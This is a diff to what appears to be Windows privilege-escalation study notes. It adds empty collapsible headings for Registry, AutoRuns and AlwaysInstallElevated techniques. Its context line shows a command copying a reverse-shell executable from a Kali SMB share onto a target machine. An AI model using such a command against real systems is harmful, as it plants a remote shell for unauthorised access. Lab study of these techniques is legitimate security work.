@@ -843,8 +843,50 @@ copy \\10.8.47.102\kali\reverse.exe C:\PrivEsc\reverse.exe
 
 
 <details>
-  <summary></summary>
+  <summary>Registry</summary>
+
+
+
+- <details>
+     <summary>AutoRuns</summary>
+
+
+
+
+
+  </details>
+
+
+
+- <details>
+     <summary>AlwaysInstallElevated</summary>
+
+
+
+
+
+  </details>
+
+
+
+     
 </details>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 <details>
   <summary></summary>
